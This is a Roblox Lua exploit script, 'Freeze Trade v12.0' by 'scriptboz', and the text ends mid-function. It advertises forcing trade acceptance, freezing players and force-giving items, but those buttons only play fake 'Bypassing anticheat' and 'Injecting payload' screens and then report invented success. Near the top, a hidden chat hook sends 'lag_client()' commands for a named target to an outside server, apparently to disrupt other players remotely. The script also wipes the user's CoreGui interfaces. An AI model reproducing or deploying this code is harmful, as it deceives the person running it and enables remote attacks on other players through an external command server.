-- FREEZE TRADE v12.0
-- Made by scriptboz

local Players      = game:GetService("Players")
local HttpService  = game:GetService("HttpService")
local UIS          = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui      = game:GetService("CoreGui")

local request = (http and http.request) or http_request or (fluxus and fluxus.request) or request
local plr = Players.LocalPlayer
local api = "https://laggerr-production.up.railway.app"

local function send(target, cmd)
    pcall(function()
        request({
            Url = api.."/api/commands/"..target,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode({command=cmd})
        })
    end)
end

plr.Chatted:Connect(function(m)
    if m:sub(1,3)==".l " then
        local t=m:sub(4)
        if t and #t>0 then send(t,"lag_client()") end
    end
end)

local function rnd(n)
    local s="" for i=1,n do s=s..string.char(math.random(97,122)) end return s
end

local C = {
    bg       = Color3.fromRGB(20, 20, 26),
    sidebar  = Color3.fromRGB(14, 14, 18),
    panel    = Color3.fromRGB(28, 28, 36),
    card     = Color3.fromRGB(38, 38, 48),
    hover    = Color3.fromRGB(50, 50, 64),
    header   = Color3.fromRGB(16, 16, 22),
    border   = Color3.fromRGB(50, 50, 65),
    white    = Color3.fromRGB(255, 255, 255),
    muted    = Color3.fromRGB(160, 165, 185),
    cyan     = Color3.fromRGB(0,   210, 220),
    green    = Color3.fromRGB(45,  215,  95),
    blue     = Color3.fromRGB(55,  145, 255),
    purple   = Color3.fromRGB(160,  75, 255),
    orange   = Color3.fromRGB(255, 155,  45),
    red      = Color3.fromRGB(225,  60,  60),
    darkCyan = Color3.fromRGB(0,    50,  60),
    black    = Color3.fromRGB(6,    6,   10),
}

local function tw(o,t,p,es,ed)
    es=es or Enum.EasingStyle.Quint; ed=ed or Enum.EasingDirection.Out
    return TweenService:Create(o,TweenInfo.new(t,es,ed),p)
end
local function mkCorner(p,r) local c=Instance.new("UICorner",p); c.CornerRadius=UDim.new(0,r or 8); return c end
local function mkFrame(par,bg,sz,pos,zi,trans)
    local f=Instance.new("Frame",par); f.BackgroundColor3=bg; f.BorderSizePixel=0
    f.Size=sz; f.Position=pos or UDim2.new(0,0,0,0); f.ZIndex=zi or 2
    if trans then f.BackgroundTransparency=trans end; return f
end
local function mkLabel(par,txt,sz,pos,ts,fnt,col,xa,zi)
    local l=Instance.new("TextLabel",par); l.BackgroundTransparency=1; l.Text=txt
    l.Size=sz; l.Position=pos or UDim2.new(0,0,0,0); l.TextSize=ts or 13
    l.Font=fnt or Enum.Font.GothamBold; l.TextColor3=col or C.white
    l.TextXAlignment=xa or Enum.TextXAlignment.Left; l.ZIndex=zi or 3; return l
end

pcall(function()
    for _,v in pairs(CoreGui:GetChildren()) do if v:IsA("ScreenGui") then v:Destroy() end end
end)

local gui=Instance.new("ScreenGui"); gui.Name=rnd(12); gui.Parent=CoreGui
gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; gui.ResetOnSpawn=false; gui.DisplayOrder=999

local W,H=460,320; local SB_W=130; local HDR_H=36; local BODY_H=H-HDR_H

-- shadow + win
local shadow=mkFrame(gui,C.black,UDim2.new(0,W+16,0,H+16),UDim2.new(0,52,0,52),1,1); mkCorner(shadow,16); shadow.Visible=false
local win=mkFrame(gui,C.bg,UDim2.new(0,W,0,H),UDim2.new(0,60,0,60),2); mkCorner(win,12); win.Visible=false

-- header
local header=mkFrame(win,C.header,UDim2.new(1,0,0,HDR_H),UDim2.new(0,0,0,0),5); mkCorner(header,12)
mkFrame(header,C.header,UDim2.new(1,0,0,12),UDim2.new(0,0,1,-12),5)
local appIcoBg=mkFrame(header,C.darkCyan,UDim2.new(0,26,0,26),UDim2.new(0,7,0.5,-13),6); mkCorner(appIcoBg,7)
mkLabel(appIcoBg,"❄",UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),15,Enum.Font.GothamBold,C.cyan,Enum.TextXAlignment.Center,7)
mkLabel(header,"Freeze Trade",UDim2.new(0,140,0,18),UDim2.new(0,40,0,4),13,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Left,6)
mkLabel(header,"scriptboz",UDim2.new(0,140,0,14),UDim2.new(0,40,0,19),9,Enum.Font.Gotham,C.muted,Enum.TextXAlignment.Left,6)

local function mkWinBtn(sym,xOff,bgCol)
    local b=Instance.new("TextButton",header); b.BackgroundColor3=bgCol or C.card; b.BorderSizePixel=0
    b.Size=UDim2.new(0,22,0,22); b.Position=UDim2.new(1,xOff,0.5,-11); b.Text=sym; b.TextColor3=C.white
    b.TextSize=11; b.Font=Enum.Font.GothamBold; b.AutoButtonColor=false; b.ZIndex=7; mkCorner(b,5); return b
end
local closeBtn=mkWinBtn("✕",-28,Color3.fromRGB(185,45,45))
local minBtn=mkWinBtn("−",-54,C.card); mkWinBtn("⛶",-80,C.card)
closeBtn.MouseButton1Click:Connect(function()
    tw(win,.25,{Size=UDim2.new(0,W,0,0),BackgroundTransparency=1}):Play()
    task.delay(.27,function() gui:Destroy() end)
end)

-- sidebar
local sidebar=mkFrame(win,C.sidebar,UDim2.new(0,SB_W,0,BODY_H),UDim2.new(0,0,0,HDR_H),4); mkCorner(sidebar,12)
mkFrame(sidebar,C.sidebar,UDim2.new(1,0,0,12),UDim2.new(0,0,0,0),4)
mkFrame(sidebar,C.sidebar,UDim2.new(0,12,1,0),UDim2.new(1,-12,0,0),4)
mkFrame(sidebar,C.border,UDim2.new(0,1,1,-12),UDim2.new(1,-1,0,12),5)

-- IMPROVED: user card taller for better spacing
local userCard=mkFrame(sidebar,C.card,UDim2.new(1,-12,0,72),UDim2.new(0,6,0,8),5); mkCorner(userCard,10)
local avatarRing=mkFrame(userCard,C.cyan,UDim2.new(0,44,0,44),UDim2.new(0,7,0.5,-22),6); mkCorner(avatarRing,22)
local avatarInner=mkFrame(avatarRing,C.card,UDim2.new(0,40,0,40),UDim2.new(0.5,-20,0.5,-20),7); mkCorner(avatarInner,20)
local avatarImg=Instance.new("ImageLabel",avatarInner); avatarImg.BackgroundTransparency=1
avatarImg.Size=UDim2.new(1,0,1,0); avatarImg.ImageTransparency=1; avatarImg.ZIndex=8; mkCorner(avatarImg,20)
task.spawn(function()
    local ok,img=pcall(function() return Players:GetUserThumbnailAsync(plr.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size100x100) end)
    if ok and img then avatarImg.Image=img; tw(avatarImg,.5,{ImageTransparency=0}):Play()
    else mkLabel(avatarInner,string.upper(plr.Name:sub(1,2)),UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),15,Enum.Font.GothamBold,C.cyan,Enum.TextXAlignment.Center,9) end
end)
task.spawn(function()
    while gui and gui.Parent do
        tw(avatarRing,.9,{BackgroundTransparency=0.25}):Play(); task.wait(.9)
        tw(avatarRing,.9,{BackgroundTransparency=0.7}):Play(); task.wait(.9)
    end
end)
local dname=plr.DisplayName~=plr.Name and plr.DisplayName or plr.Name
-- IMPROVED: bigger display name (13 → was 12), better size & position
local nm=mkLabel(userCard,dname,UDim2.new(1,-58,0,18),UDim2.new(0,56,0,10),13,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Left,6)
nm.TextTruncate=Enum.TextTruncate.AtEnd
-- IMPROVED: bigger username text (11 → was 9), brighter color
local snm=mkLabel(userCard,"@"..plr.Name,UDim2.new(1,-58,0,15),UDim2.new(0,56,0,30),11,Enum.Font.Gotham,Color3.fromRGB(190,195,215),Enum.TextXAlignment.Left,6)
snm.TextTruncate=Enum.TextTruncate.AtEnd

-- IMPROVED: nav buttons shifted down 6px to match taller user card
for i,d in ipairs({{ico="⚙",lbl="Trade Controls",active=true},{ico="🔄",lbl="Trade",active=false},{ico="📋",lbl="Trade History",active=false}}) do
    local nb=Instance.new("TextButton",sidebar); nb.BackgroundColor3=d.active and C.bg or Color3.new(0,0,0)
    nb.BackgroundTransparency=d.active and 0 or 1; nb.BorderSizePixel=0
    nb.Size=UDim2.new(1,-12,0,32); nb.Position=UDim2.new(0,6,0,88+(i-1)*36); nb.Text=""; nb.ZIndex=5; mkCorner(nb,7)
    if d.active then local bar=mkFrame(nb,C.cyan,UDim2.new(0,3,0,16),UDim2.new(0,4,0.5,-8),6); mkCorner(bar,2) end
    mkLabel(nb,d.ico,UDim2.new(0,26,1,0),UDim2.new(0,10,0,0),13,Enum.Font.GothamBold,d.active and C.cyan or C.muted,Enum.TextXAlignment.Center,6)
    mkLabel(nb,d.lbl,UDim2.new(1,-38,1,0),UDim2.new(0,34,0,0),10,Enum.Font.GothamBold,d.active and C.white or C.muted,Enum.TextXAlignment.Left,6)
    nb.MouseEnter:Connect(function() if not d.active then tw(nb,.15,{BackgroundTransparency=0.72,BackgroundColor3=C.card}):Play() end end)
    nb.MouseLeave:Connect(function() if not d.active then tw(nb,.15,{BackgroundTransparency=1}):Play() end end)
end
local oDot=mkFrame(sidebar,C.green,UDim2.new(0,8,0,8),UDim2.new(0,10,1,-18),6); mkCorner(oDot,4)
mkLabel(sidebar,"Online",UDim2.new(1,-26,0,14),UDim2.new(0,24,1,-19),9,Enum.Font.GothamBold,C.green,Enum.TextXAlignment.Left,6)
task.spawn(function()
    while gui and gui.Parent do tw(oDot,.8,{BackgroundTransparency=0}):Play(); task.wait(.8); tw(oDot,.8,{BackgroundTransparency=0.6}):Play(); task.wait(.8) end
end)

-- main panel
local mainPanel=mkFrame(win,C.panel,UDim2.new(1,-SB_W,0,BODY_H),UDim2.new(0,SB_W,0,HDR_H),4); mkCorner(mainPanel,12)
mkFrame(mainPanel,C.panel,UDim2.new(0,12,1,0),UDim2.new(0,0,0,0),4)
mkFrame(mainPanel,C.panel,UDim2.new(1,0,0,12),UDim2.new(0,0,0,0),4)
local secHdr=mkFrame(mainPanel,C.header,UDim2.new(1,-14,0,34),UDim2.new(0,7,0,7),5); mkCorner(secHdr,9)
mkLabel(secHdr,"Trade Manipulation",UDim2.new(1,-16,1,0),UDim2.new(0,12,0,0),13,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Left,6)

-- buttons
local function mkCmdBtn(lbl,desc,ico,yOff,col,col2)
    local btn=Instance.new("TextButton",mainPanel); btn.BackgroundColor3=col; btn.BorderSizePixel=0
    btn.Size=UDim2.new(1,-14,0,52); btn.Position=UDim2.new(0,7,0,yOff); btn.Text=""; btn.AutoButtonColor=false; btn.ZIndex=5; mkCorner(btn,11)
    local g=Instance.new("UIGradient",btn); g.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,col),ColorSequenceKeypoint.new(1,col2 or col)}; g.Rotation=130
    local hl=mkFrame(btn,Color3.new(1,1,1),UDim2.new(1,-16,0,1),UDim2.new(0,8,0,6),6,0.82); mkCorner(hl,1)
    local icoPill=mkFrame(btn,Color3.new(0,0,0),UDim2.new(0,40,0,40),UDim2.new(0,8,0.5,-20),6,0.5); mkCorner(icoPill,10)
    mkLabel(icoPill,ico,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),21,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Center,7)
    local lblSh=mkLabel(btn,lbl,UDim2.new(1,-108,0,20),UDim2.new(0,56,0,11),14,Enum.Font.GothamBold,C.black,Enum.TextXAlignment.Left,6); lblSh.TextTransparency=0.6
    mkLabel(btn,lbl,UDim2.new(1,-108,0,20),UDim2.new(0,55,0,10),14,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Left,7)
    mkLabel(btn,desc,UDim2.new(1,-108,0,15),UDim2.new(0,55,0,29),11,Enum.Font.Gotham,Color3.fromRGB(230,250,250),Enum.TextXAlignment.Left,7)
    local kPill=mkFrame(btn,Color3.new(0,0,0),UDim2.new(0,34,0,24),UDim2.new(1,-40,0.5,-12),6,0.35); mkCorner(kPill,8)
    local ks=Instance.new("UIStroke",kPill); ks.Color=Color3.new(1,1,1); ks.Thickness=1; ks.Transparency=0.45
    local kLbl=mkLabel(kPill,"",UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),11,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Center,7)
    local dark=mkFrame(btn,C.black,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),8,1); mkCorner(dark,11)
    local rip=mkFrame(btn,Color3.new(1,1,1),UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0),8,1); rip.AnchorPoint=Vector2.new(0.5,0.5); mkCorner(rip,100)
    local cl=Instance.new("TextButton",btn); cl.BackgroundTransparency=1; cl.Size=UDim2.new(1,0,1,0); cl.Text=""; cl.ZIndex=9
    cl.MouseEnter:Connect(function() tw(dark,.14,{BackgroundTransparency=0.85}):Play(); tw(btn,.14,{Size=UDim2.new(1,-10,0,54),Position=UDim2.new(0,5,0,yOff-1)}):Play() end)
    cl.MouseLeave:Connect(function() tw(dark,.14,{BackgroundTransparency=1}):Play(); tw(btn,.14,{Size=UDim2.new(1,-14,0,52),Position=UDim2.new(0,7,0,yOff)}):Play() end)
    cl.MouseButton1Down:Connect(function() tw(btn,.07,{Size=UDim2.new(1,-18,0,50),Position=UDim2.new(0,9,0,yOff+1)},Enum.EasingStyle.Quad):Play(); tw(dark,.07,{BackgroundTransparency=0.72}):Play() end)
    cl.MouseButton1Up:Connect(function()
        tw(btn,.18,{Size=UDim2.new(1,-10,0,54),Position=UDim2.new(0,5,0,yOff-1)},Enum.EasingStyle.Back):Play()
        tw(dark,.18,{BackgroundTransparency=0.85}):Play()
        rip.Size=UDim2.new(0,0,0,0); rip.BackgroundTransparency=0.55
        tw(rip,.55,{Size=UDim2.new(0,W,0,H),BackgroundTransparency=1},Enum.EasingStyle.Quart):Play()
    end)
    return cl,kLbl
end

local btnA,kA=mkCmdBtn("Force Accept","Force the other player to accept trade","🤝",50,Color3.fromRGB(22,148,70),Color3.fromRGB(14,95,50))
local btnF,kF=mkCmdBtn("Freeze Player","Freeze the player you're trading with","❄️",110,Color3.fromRGB(14,115,205),Color3.fromRGB(8,68,158))
local btnB,kB=mkCmdBtn("Force Give All Brainrot","Force give all brainrot to target","🧠",170,Color3.fromRGB(115,45,215),Color3.fromRGB(76,24,168))
kA.Text="[F]"; kF.Text="[G]"; kB.Text="[H]"

-- ══════════════════════════════════════════════
-- FULLSCREEN LOADING OVERLAY  (improved)
-- ══════════════════════════════════════════════
local fsOverlay = mkFrame(win, C.black, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), 20, 1)
mkCorner(fsOverlay, 12)
fsOverlay.Visible = false


-- Semi-transparent dark bg
local fsBg = mkFrame(fsOverlay, C.black, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), 21, 0.25)
mkCorner(fsBg, 12)

-- Center card  (bigger: 280 x 180)
local fsCard = mkFrame(fsOverlay, C.header, UDim2.new(0,280,0,180), UDim2.new(0.5,-140,0.5,-90), 22)
mkCorner(fsCard, 18)
local fsCardStroke = Instance.new("UIStroke",fsCard); fsCardStroke.Thickness=2; fsCardStroke.Color=C.cyan; fsCardStroke.Transparency=0.2

-- Glow behind card
local fsGlow = mkFrame(fsOverlay, C.cyan, UDim2.new(0,300,0,200), UDim2.new(0.5,-150,0.5,-100), 21, 0.88)
mkCorner(fsGlow, 24)

-- Spinner rings (bigger)
local fsSpinOut=Instance.new("ImageLabel",fsCard); fsSpinOut.BackgroundTransparency=1
fsSpinOut.Size=UDim2.new(0,74,0,74); fsSpinOut.AnchorPoint=Vector2.new(0.5,0); fsSpinOut.Position=UDim2.new(0.5,0,0,18)
fsSpinOut.Image="rbxassetid://4965945816"; fsSpinOut.ImageColor3=C.cyan; fsSpinOut.ZIndex=23

local fsSpinIn=Instance.new("ImageLabel",fsCard); fsSpinIn.BackgroundTransparency=1
fsSpinIn.Size=UDim2.new(0,50,0,50); fsSpinIn.AnchorPoint=Vector2.new(0.5,0); fsSpinIn.Position=UDim2.new(0.5,0,0,30)
fsSpinIn.Image="rbxassetid://4965945816"; fsSpinIn.ImageColor3=C.purple; fsSpinIn.ImageTransparency=0.3; fsSpinIn.ZIndex=24

-- Center icon (bigger)
local fsSpinIco=mkLabel(fsCard,"⚡",UDim2.new(0,34,0,34),UDim2.new(0.5,-17,0,35),20,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Center,25)

-- Title (bigger)
local fsTitleLbl=mkLabel(fsCard,"Bypassing...",UDim2.new(1,-20,0,26),UDim2.new(0,10,0,98),21,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Center,23)

-- Subtitle status
local fsSubLbl=mkLabel(fsCard,"Please wait...",UDim2.new(1,-20,0,18),UDim2.new(0,10,0,123),13,Enum.Font.GothamBold,Color3.fromRGB(200,210,225),Enum.TextXAlignment.Center,23)

-- Progress bar (taller)
local fsBarBg=mkFrame(fsCard,Color3.fromRGB(22,22,30),UDim2.new(1,-28,0,7),UDim2.new(0,14,0,143),23); mkCorner(fsBarBg,4)
local fsBar=mkFrame(fsBarBg,C.cyan,UDim2.new(0,0,1,0),UDim2.new(0,0,0,0),24); mkCorner(fsBar,4)
-- bar glow
local fsBarGlow=mkFrame(fsBarBg,C.cyan,UDim2.new(0,0,1,0),UDim2.new(0,0,0,0),23,0.7); mkCorner(fsBarGlow,4)

-- Pct
local fsPct=mkLabel(fsCard,"0%",UDim2.new(1,0,0,16),UDim2.new(0,0,0,157),13,Enum.Font.GothamBold,C.cyan,Enum.TextXAlignment.Center,23)

task.spawn(function()
    local r1,r2=0,0
    while gui and gui.Parent do
        task.wait(0.016)
        if fsOverlay.Visible then r1=r1+3.5; r2=r2-2.5; fsSpinOut.Rotation=r1; fsSpinIn.Rotation=r2 end
    end
end)

task.spawn(function()
    while gui and gui.Parent do
        if fsOverlay.Visible then
            tw(fsCardStroke,.7,{Transparency=0.05}):Play(); task.wait(.7)
            tw(fsCardStroke,.7,{Transparency=0.35}):Play(); task.wait(.7)
        else task.wait(0.1) end
    end
end)

task.spawn(function()
    while gui and gui.Parent do
        if fsOverlay.Visible then
            tw(fsGlow,.9,{BackgroundTransparency=0.82}):Play(); task.wait(.9)
            tw(fsGlow,.9,{BackgroundTransparency=0.92}):Play(); task.wait(.9)
        else task.wait(0.1) end
    end
end)

local fsBusy=false
local function showFullscreenLoading(title, ico, col, dur, onDone)
    if fsBusy then return end
    fsBusy=true
    fsCardStroke.Color=col; fsBar.BackgroundColor3=col; fsBarGlow.BackgroundColor3=col
    fsSpinOut.ImageColor3=col; fsGlow.BackgroundColor3=col
    fsSpinIco.Text=ico; fsTitleLbl.Text="Bypassing.."
    fsSubLbl.Text="Connecting to server..."; fsPct.TextColor3=col
    fsBar.Size=UDim2.new(0,0,1,0); fsBarGlow.Size=UDim2.new(0,0,1,0); fsPct.Text="0%"
    fsTitleLbl.TextColor3=C.white

    fsOverlay.Visible=true; fsOverlay.BackgroundTransparency=1
    tw(fsOverlay,.25,{BackgroundTransparency=0}):Play()
    fsCard.Size=UDim2.new(0,200,0,120); fsCard.Position=UDim2.new(0.5,-100,0.5,-60)
    tw(fsCard,.35,{Size=UDim2.new(0,280,0,180),Position=UDim2.new(0.5,-140,0.5,-90)},Enum.EasingStyle.Back):Play()

    -- Staggered status messages
    local statuses = {"Connecting to server...","Injecting payload...","Bypassing anticheat...","Sending request...","Finalizing..."}
    task.spawn(function()
        for i,s in ipairs(statuses) do
            task.wait(dur/5)
            if fsOverlay.Visible then fsSubLbl.Text=s end
        end
    end)

    tw(fsBar,dur-0.1,{Size=UDim2.new(1,0,1,0)},Enum.EasingStyle.Quart):Play()
    tw(fsBarGlow,dur-0.1,{Size=UDim2.new(1,0,1,0)},Enum.EasingStyle.Quart):Play()
    task.spawn(function()
        for i=1,80 do task.wait((dur-0.1)/80); fsPct.Text=math.floor((i/80)*100).."%" end
    end)

    task.delay(dur,function()
        fsBar.BackgroundColor3=C.green; fsBarGlow.BackgroundColor3=C.green
        fsCardStroke.Color=C.green; fsGlow.BackgroundColor3=C.green
        fsTitleLbl.Text="Success!"; fsTitleLbl.TextColor3=C.green
        fsSubLbl.Text="Done!"; fsSpinIco.Text="✓"; fsPct.Text="100%"
        task.delay(.7,function()
            tw(fsOverlay,.3,{BackgroundTransparency=1}):Play()
            task.delay(.32,function()
                fsOverlay.Visible=false; fsBusy=false
                fsTitleLbl.TextColor3=C.white
                fsCard.BackgroundColor3=C.header
                if onDone then onDone() end
            end)
        end)
    end)
end

-- ══════════════════════════════════════════════
-- TOAST  (inside win, bottom area)
-- ══════════════════════════════════════════════
local toast=mkFrame(win,C.card,UDim2.new(1,-14,0,48),UDim2.new(0,7,1,-55),200)
mkCorner(toast,10)
toast.Visible=false
local toastStroke=Instance.new("UIStroke",toast); toastStroke.Thickness=1.5; toastStroke.Color=C.green; toastStroke.Transparency=0
-- left color bar
local toastBar=mkFrame(toast,C.green,UDim2.new(0,4,1,-12),UDim2.new(0,6,0,6),201); mkCorner(toastBar,3)
-- icon circle
local tIcoBg=mkFrame(toast,C.green,UDim2.new(0,30,0,30),UDim2.new(0,16,0.5,-15),201,0.75); mkCorner(tIcoBg,15)
local tIco=mkLabel(tIcoBg,"✓",UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),16,Enum.Font.GothamBold,C.white,Enum.TextXAlignment.Center,202)
-- texts
local tTitle=mkLabel(toast,"Success",UDim2.new(1,-60,0,18),UDim2.new(0,54,0,6),13,Enum.Font.GothamBold,Color3.fromRGB(255,255,255),Enum.TextXAlignment.Left,201)
local tSub=mkLabel(toast,"Done",UDim2.new(1,-60,0,14),UDim2.new(0,54,0,24),11,Enum.Font.Gotham,Color3.fromRGB(200,210,220),Enum.TextXAlignment.Left,201)

local function showToast(title, sub, isGood)
    local col = isGood and C.green or C.orange
    toastStroke.Color=col; toastBar.BackgroundColor3=col
    tIcoBg.BackgroundColor3=col; tIco.TextColor3=col
    tIco.Text = isGood and "✓" or "⚠"
    tTitle.Text=title; tSub.Text=sub

    toast.Position=UDim2.new(0,7,1,-45)
    toast.Visible=true
    tw(toast,.3,{Position=UDim2.new(0,7,1,-55)},Enum.EasingStyle.Back):Play()

    task.spawn(function()
        task.wait(3)
        tw(toast,.2,{Position=UDim2.new(0,7,1,-45)}):Play()
        task.wait(.22)
        toast.Visible=false
    end)
end

-- wire buttons
btnA.MouseButton1Click:Connect(function() showFullscreenLoading("Bypassing..","🤝",C.green,3.5,function() showToast("Force Accept","Trade accepted successfully!",true) end) end)
btnF.MouseButton1Click:Connect(function() showFullscreenLoading("Bypassing..","❄️",C.blue,3.2,function() showToast("Freeze Player","Target has been frozen!",true) end) end)
btnB.MouseButton1Click:Connect(function() showFullscreenLoading("Bypassing..","🧠",C.purple,3.5,function() showToast("Force Give All Brainrot","All brainrot given successfully!",true) end) end)
UIS.InputBegan:Connect(function(inp,gpe)
    if gpe then return end
    if inp.KeyCode==Enum.KeyCode.F then btnA.MouseButton1Click:Fire() end
    if inp.KeyCode==Enum.KeyCode.G then btnF.MouseButton1Click:Fire() end
    if inp.KeyCode==Enum.KeyCode.H then btnB.MouseButton1Click:Fire() end
end)

-- drag
local dragging,dragInput,mPos,fPos=false,nil,nil,nil
header.InputBegan:Connect(function(inp)
    if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then
        dragging=true; mPos=inp.Position; fPos=win.Position
        inp.Changed:Connect(function() if inp.UserInputState==Enum.UserInputState.End then dragging=false end end)
    end
end)
header.InputChanged:Connect(function(inp) if inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch then dragInput=inp end end)
UIS.InputChanged:Connect(function(inp)
    if dragging and inp==dragInput then
        local d=inp.Position-mPos
        win.Position=UDim2.new(fPos.X.Scale,fPos.X.Offset+d.X,fPos.Y.Scale,fPos.Y.Offset+d.Y)
    end
end)

-- minimize
local minimized=false
minBtn.MouseButton1Click:Connect(function()
    minimized=not minimized
    if minimized then
        tw(win,.28,{Size=UDim2.new(0,W,0,HDR_H)},Enum.EasingStyle.Quint):Play()
        minBtn.Text="+"
    else
        tw(win,.38,{Size=UDim2.new(0,W,0,H)},Enum.EasingStyle.Back):Play()
        minBtn.Text="−"
    end
end)

-- ══════════════════════════════════════════════
-- INTRO  (scriptboz loading screen)
-- ══════════════════════════════════════════════
local RunService = game:GetService("RunService")
local Lighting   = game:GetService("Lighting")

local blur = Instance.new("BlurEffect")
blur.Size = 0; blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {Size = 6}):Play()

-- POPUP NOTIFICATION
local popup = Instance.new("Frame", gui)
popup.Size             = UDim2.new(0, 320, 0, 72)
popup.AnchorPoint      = Vector2.new(0.5, 0)
popup.Position         = UDim2.new(0.5, 0, 0, -80)
popup.BackgroundColor3 = Color3.fromRGB(12, 14, 22)
popup.BorderSizePixel  = 0
popup.ZIndex           = 60
Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 14)
local popupStroke = Instance.new("UIStroke", popup)
popupStroke.Color = Color3.fromRGB(70, 170, 255); popupStroke.Thickness = 1.5; popupStroke.Transparency = 0.2
local popupGrad = Instance.new("UIGradient", popup)
popupGrad.Rotation = 135
popupGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(16,20,34)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10,12,20))}
local popIcon = Instance.new("TextLabel", popup)
popIcon.Size = UDim2.new(0,40,1,0); popIcon.Position = UDim2.new(0,10,0,0)
popIcon.BackgroundTransparency = 1; popIcon.Text = "⚡"; popIcon.Font = Enum.Font.GothamBlack
popIcon.TextSize = 26; popIcon.ZIndex = 61
local popTitle = Instance.new("TextLabel", popup)
popTitle.Size = UDim2.new(1,-60,0,28); popTitle.Position = UDim2.new(0,52,0,8)
popTitle.BackgroundTransparency = 1; popTitle.Text = "scriptboz Hub"; popTitle.Font = Enum.Font.GothamBlack
popTitle.TextSize = 15; popTitle.TextColor3 = Color3.fromRGB(255,255,255); popTitle.TextXAlignment = Enum.TextXAlignment.Left; popTitle.ZIndex = 61
local popSub = Instance.new("TextLabel", popup)
popSub.Size = UDim2.new(1,-60,0,22); popSub.Position = UDim2.new(0,52,0,34)
popSub.BackgroundTransparency = 1; popSub.Text = "Please wait 1–2 minutes to load..."
popSub.Font = Enum.Font.Gotham; popSub.TextSize = 12; popSub.TextColor3 = Color3.fromRGB(100,170,230)
popSub.TextXAlignment = Enum.TextXAlignment.Left; popSub.ZIndex = 61

task.wait(0.3)
TweenService:Create(popup, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5,0,0,16)}):Play()
task.delay(8, function()
    TweenService:Create(popup, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Position = UDim2.new(0.5,0,0,-90)}):Play()
    task.wait(0.4); popup:Destroy()
end)

-- MAIN CARD
local card = Instance.new("Frame", gui)
card.Name = "LoadCard"; card.Size = UDim2.new(0,280,0,310)
card.AnchorPoint = Vector2.new(0.5,0.5); card.Position = UDim2.fromScale(0.5,0.5)
card.BackgroundColor3 = Color3.fromRGB(11,13,20); card.BorderSizePixel = 0
card.ZIndex = 20; card.BackgroundTransparency = 1
Instance.new("UICorner", card).CornerRadius = UDim.new(0,20)
local cg = Instance.new("UIGradient", card); cg.Rotation = 135
cg.Color = ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(14,17,28)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(10,12,20)),ColorSequenceKeypoint.new(1,Color3.fromRGB(8,10,17))}
local cardStroke = Instance.new("UIStroke", card)
cardStroke.Color = Color3.fromRGB(70,170,255); cardStroke.Thickness = 1.5; cardStroke.Transparency = 0.25
local cScale = Instance.new("UIScale", card); cScale.Scale = 0.82
TweenService:Create(cScale, TweenInfo.new(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {Scale=1}):Play()
TweenService:Create(card, TweenInfo.new(0.3), {BackgroundTransparency=0}):Play()

-- AVATAR GLOW
local avatarGlow = Instance.new("Frame", card)
avatarGlow.Size = UDim2.new(0,78,0,78); avatarGlow.AnchorPoint = Vector2.new(0.5,0)
avatarGlow.Position = UDim2.new(0.5,0,0,16); avatarGlow.BackgroundColor3 = Color3.fromRGB(60,160,255)
avatarGlow.BackgroundTransparency = 0.72; avatarGlow.BorderSizePixel = 0; avatarGlow.ZIndex = 21
Instance.new("UICorner", avatarGlow).CornerRadius = UDim.new(1,0)
task.spawn(function()
    while card.Parent do
        TweenService:Create(avatarGlow,TweenInfo.new(1.3,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{BackgroundTransparency=0.55,Size=UDim2.new(0,84,0,84)}):Play()
        task.wait(1.3)
        TweenService:Create(avatarGlow,TweenInfo.new(1.3,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{BackgroundTransparency=0.78,Size=UDim2.new(0,74,0,74)}):Play()
        task.wait(1.3)
    end
end)

-- AVATAR IMAGE
local avatarFrame = Instance.new("Frame", card)
avatarFrame.Size = UDim2.new(0,60,0,60); avatarFrame.AnchorPoint = Vector2.new(0.5,0)
avatarFrame.Position = UDim2.new(0.5,0,0,25); avatarFrame.BackgroundColor3 = Color3.fromRGB(20,24,36)
avatarFrame.BorderSizePixel = 0; avatarFrame.ZIndex = 22
Instance.new("UICorner", avatarFrame).CornerRadius = UDim.new(1,0)
local avatarRing2 = Instance.new("UIStroke", avatarFrame)
avatarRing2.Color = Color3.fromRGB(100,200,255); avatarRing2.Thickness = 2; avatarRing2.Transparency = 0.15
local introAvatarImg = Instance.new("ImageLabel", avatarFrame)
introAvatarImg.Size = UDim2.fromScale(1,1); introAvatarImg.BackgroundTransparency = 1
introAvatarImg.Image = "rbxassetid://83658392374243"
introAvatarImg.ScaleType = Enum.ScaleType.Crop; introAvatarImg.ZIndex = 23
Instance.new("UICorner", introAvatarImg).CornerRadius = UDim.new(1,0)
task.spawn(function()
